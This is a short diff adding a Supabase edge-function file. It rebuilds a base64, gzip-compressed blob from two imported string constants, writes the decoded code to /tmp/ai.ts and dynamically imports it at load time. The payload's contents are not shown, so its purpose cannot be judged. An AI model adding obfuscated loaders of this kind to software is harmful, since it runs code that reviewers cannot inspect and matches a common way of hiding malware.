@@ -1,1 +1,11 @@
-PLACEHOLDER
+import "jsr:@supabase/functions-js/edge-runtime.d.ts";
+import { C0 } from "./c0.ts";
+import { C1 } from "./c1.ts";
+const B64 = C0 + C1;
+const bin = Uint8Array.from(atob(B64), c => c.charCodeAt(0));
+const ds = new DecompressionStream("gzip");
+const stream = new Blob([bin]).stream().pipeThrough(ds);
+const buf = await new Response(stream).arrayBuffer();
+const code = new TextDecoder().decode(buf);
+await Deno.writeTextFile("/tmp/ai.ts", code);
+await import("file:///tmp/ai.ts");
